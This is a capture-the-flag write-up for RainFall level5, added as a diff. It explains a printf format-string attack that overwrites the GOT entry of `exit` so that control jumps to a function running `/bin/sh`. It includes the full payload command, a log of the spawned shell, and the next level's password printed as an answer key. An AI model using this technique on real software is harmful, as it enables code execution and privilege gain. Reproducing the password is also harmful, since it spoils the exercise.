@@ -1,0 +1,27 @@
+The level5 program contains a function `n` called in the main function.
+
+Using `info functions` in gdb, we see that there exists a function `o`, which when we disassemble it appears to use the function `system`.
+We can quickly see that it calls `system("/bin/sh")`.
+
+At first glance we don't have any entry point to `o`, however, using the same idea from previous levels, we can make use of `printf` and `fgets` to call it.
+
+We can overwrite the GOT entry of `exit`, which is called in `n`, to call `o`.
+The GOT entry of exit is `0x8049838`
+The address of `o` is `0x080484a4`
+
+The structure of our exploit is as follow:
+- bytes 0-4: The address of the GOT entry of exit
+- bytes 4-8: That same address + 2, since we will write the address of `o` 2 bytes per 2 bytes
+- bytes 8-2052: Filler bytes used by the %n formatter of printf in order to write the first 2 bytes of the address of `o`, that is, 0x0804
+- bytes 2052-33956: Filler bytes used to write the last 2 bytes, 0x84a4
+
+The command looks like this:
+`(python -c "print '\x08\x04\x98\x38'[::-1] + '\x08\x04\x98\x3a'[::-1] + '%02044x' + '%5\$hn' + '%031904x' + '%4\$hn'"; cat) | ./level5`
+
+level5@RainFall:~$ (python -c "print '\x08\x04\x98\x38'[::-1] + '\x08\x04\x98\x3a'[::-1] + '%02044x' + '%5\$hn' + '%031904x' + '%4\$hn'"; cat) | ./level5
+...
+whoami
+level6
+cd ../level6
+cat .pass
+d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
